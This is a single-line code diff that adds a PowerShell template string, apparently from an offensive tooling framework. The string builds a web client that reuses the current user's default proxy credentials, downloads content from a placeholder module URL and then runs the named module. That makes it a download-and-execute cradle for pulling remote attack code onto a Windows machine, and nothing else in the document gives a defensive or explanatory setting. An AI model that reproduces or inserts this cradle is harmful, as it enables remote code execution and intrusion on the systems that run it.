@@ -1,0 +1,1 @@
+$$wc=New-Object System.Net.WebClient;$$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredential;($$dlFile=$$wc.Downloadstring('${moduleURL}'));${moduleName}
